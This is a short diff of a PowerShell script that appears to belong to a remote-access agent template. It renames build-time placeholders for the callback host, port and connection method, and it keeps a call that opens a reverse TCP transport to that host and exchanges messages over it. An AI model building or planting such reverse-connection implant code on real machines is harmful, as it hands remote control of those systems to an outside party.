@@ -1,10 +1,10 @@
 
-$CONNECTIONMETHOD = "TCP" # TODO
-$LHOST = "SYREPLACE_LHOST"
-$LPORT = "SYREPLACE_LPORT"
+$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
+$CONNECTHOST = "SYREPLACE_CONNECTHOST"
+$CONNECTPORT = "SYREPLACE_CONNECTPORT"
 
 if ($CONNECTIONMETHOD -eq "TCP") {
-    $transport = Transport-ReverseTcp-Open -LHost $LHOST -LPort $LPORT
+    $transport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
 	$res = Message-ParseFromTransport $transport
 	$res.content -join '' | Write-Output
 	$message1 = Message-Create -MType 1 -Content "Test"
